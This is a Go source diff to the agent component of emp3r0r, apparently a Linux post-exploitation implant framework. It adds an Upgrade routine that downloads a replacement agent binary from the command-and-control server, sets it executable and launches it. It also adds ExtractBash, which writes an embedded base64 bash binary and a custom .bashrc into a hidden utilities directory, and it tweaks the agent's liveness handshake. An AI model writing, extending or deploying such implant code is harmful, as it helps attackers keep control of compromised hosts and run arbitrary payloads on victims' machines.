@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package agent
 
 import (
@@ -5,12 +8,15 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -46,12 +52,12 @@ func IsAgentAlive() bool {
 
 	// send hello to agent
 	for {
-		_, err := c.Write([]byte("emp3r0r"))
+		_, err := c.Write([]byte(fmt.Sprintf("hello from %d", os.Getpid())))
 		if err != nil {
 			log.Print("write error:", err)
 			break
 		}
-		if <-replyFromAgent == "emp3r0r" {
+		if strings.Contains(<-replyFromAgent, "emp3r0r") {
 			log.Println("Yes it's alive")
 			return true
 		}
@@ -86,6 +92,7 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	emp3r0r_data.AgentTag = util.GetHostID(emp3r0r_data.AgentUUID)
 	info.Tag = emp3r0r_data.AgentTag // use hostid
 	info.Hostname = hostname
+	info.Version = emp3r0r_data.Version
 	info.Kernel = util.GetKernelVersion()
 	info.Arch = runtime.GOARCH
 	info.CPU = util.GetCPUInfo()
@@ -124,6 +131,23 @@ func CollectSystemInfo() *emp3r0r_data.SystemInfo {
 	return &info
 }
 
+func Upgrade(checksum string) error {
+	tempfile := emp3r0r_data.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
+	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/agent", tempfile)
+	if err != nil {
+		return fmt.Errorf("Download agent: %v", err)
+	}
+	download_checksum := tun.SHA256SumFile(tempfile)
+	if checksum != download_checksum {
+		return fmt.Errorf("checksum mismatch: %s expected, got %s", checksum, download_checksum)
+	}
+	err = os.Chmod(tempfile, 0755)
+	if err != nil {
+		return fmt.Errorf("chmod %s: %v", tempfile, err)
+	}
+	return exec.Command(tempfile, "-replace").Start()
+}
+
 func calculateReverseProxyPort() string {
 	p, err := strconv.Atoi(emp3r0r_data.ProxyPort)
 	if err != nil {
@@ -134,4 +158,28 @@ func calculateReverseProxyPort() string {
 	// reverseProxyPort
 	rProxyPortInt := p + 1
 	return strconv.Itoa(rProxyPortInt)
+}
+
+func ExtractBash() error {
+	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
+		err := os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
+		if err != nil {
+			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
+		}
+	}
+
+	bashData := tun.Base64Decode(emp3r0r_data.BashBinary)
+	if bashData == nil {
+		log.Printf("bash binary decode failed")
+	}
+	checksum := tun.SHA256SumRaw(bashData)
+	if checksum != emp3r0r_data.BashChecksum {
+		return fmt.Errorf("bash checksum error")
+	}
+	err := ioutil.WriteFile(emp3r0r_data.UtilsPath+"/.bashrc", []byte(emp3r0r_data.BashRC), 0600)
+	if err != nil {
+		log.Printf("Write bashrc: %v", err)
+	}
+
+	return ioutil.WriteFile(emp3r0r_data.UtilsPath+"/bash", bashData, 0755)
 }
